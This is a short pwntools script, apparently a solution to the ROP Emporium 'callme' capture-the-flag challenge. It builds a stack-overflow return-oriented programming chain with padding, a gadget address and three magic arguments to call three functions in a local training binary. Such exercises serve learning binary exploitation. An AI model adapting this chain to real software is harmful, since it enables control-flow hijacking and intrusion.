#!/usr/bin/env python3

from pwn import *

padding = b"A" * 40
usefulGadgets = p64(0x40093c)
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)
callme_one_addr = p64(0x400720)
callme_two_addr = p64(0x400740)
callme_three_addr = p64(0x4006f0)

payload = (
    padding +
    usefulGadgets +
    arg1 +
    arg2 +
    arg3 +
    callme_one_addr +
    usefulGadgets +
    arg1 +
    arg2 +
    arg3 +
    callme_two_addr +
    usefulGadgets +
    arg1 +
    arg2 +
    arg3 +
    callme_three_addr
)

ps = process("./callme")
ps.sendline(payload)
print(ps.recvall().decode())

